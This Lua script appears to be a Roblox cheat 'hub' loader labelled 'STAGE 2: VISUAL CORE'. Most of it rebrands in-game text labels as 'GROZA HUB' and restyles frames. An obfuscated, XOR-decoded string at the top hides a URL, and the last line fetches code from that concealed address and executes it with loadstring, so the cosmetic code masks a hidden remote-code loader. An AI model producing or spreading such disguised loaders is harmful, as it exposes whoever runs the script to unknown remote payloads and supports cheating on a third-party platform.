
--[[ STAGE 2: VISUAL CORE ]]
local d_YnZyDVkax4WNhMR="\053\200\199\202\198\030\008\007\195\051\220\004\202\199\219\198\216\202\214\215\196\214\196\215\215\208\222\212\237\018\220\239\208\045\237\235\235\215\234\209\232\211\229\255\237\033\237\252\228\233\224\243\232\252\251\055\248\227\250\244\050\210\218\231\254\214\143\129\250\237\142\138\137\243\158\128\240\241\249\133\157\135\153\243\154\150\156\147\253\175\129\131\142\145\170\172\154\151\156\233\232\147\228\224\224\252\146\228\165\187\174"local tmu75FHnhzE_i=207 local z_whQuteg_I7=143 local zdzgWhHyrITLd=1 local kynywvIT04U3BQI4P=1 local pI_SKoK_CXkH9Uo1f_iqEN=2 local epFqJJTuJgbm3L=false local oy7zdLI5IuzPE8=bit32 and bit32.bxor if not oy7zdLI5IuzPE8 then oy7zdLI5IuzPE8=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local b8wsXJMkmYbbfGilw1a3={}for QQwTzHULIqTHwyLd9mv=1,#d_YnZyDVkax4WNhMR do local zoJGqA8s2_2mRTsZoefSz=string.byte(d_YnZyDVkax4WNhMR,QQwTzHULIqTHwyLd9mv)local QNJc609qWIhe=(z_whQuteg_I7+(QQwTzHULIqTHwyLd9mv*kynywvIT04U3BQI4P)+pI_SKoK_CXkH9Uo1f_iqEN)%256 if zdzgWhHyrITLd==0 then zoJGqA8s2_2mRTsZoefSz=(zoJGqA8s2_2mRTsZoefSz-QNJc609qWIhe)%256 b8wsXJMkmYbbfGilw1a3[QQwTzHULIqTHwyLd9mv]=string.char(oy7zdLI5IuzPE8(zoJGqA8s2_2mRTsZoefSz,tmu75FHnhzE_i))else zoJGqA8s2_2mRTsZoefSz=oy7zdLI5IuzPE8(zoJGqA8s2_2mRTsZoefSz,tmu75FHnhzE_i)b8wsXJMkmYbbfGilw1a3[QQwTzHULIqTHwyLd9mv]=string.char((zoJGqA8s2_2mRTsZoefSz-QNJc609qWIhe)%256)end end local huE6y9icLLWOvHSvDb=table.concat(b8wsXJMkmYbbfGilw1a3)if epFqJJTuJgbm3L then huE6y9icLLWOvHSvDb=string.reverse(huE6y9icLLWOvHSvDb)end local o1IM9opiHXytmM5a7OfDf=huE6y9icLLWOvHSvDb
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(o1IM9opiHXytmM5a7OfDf))()
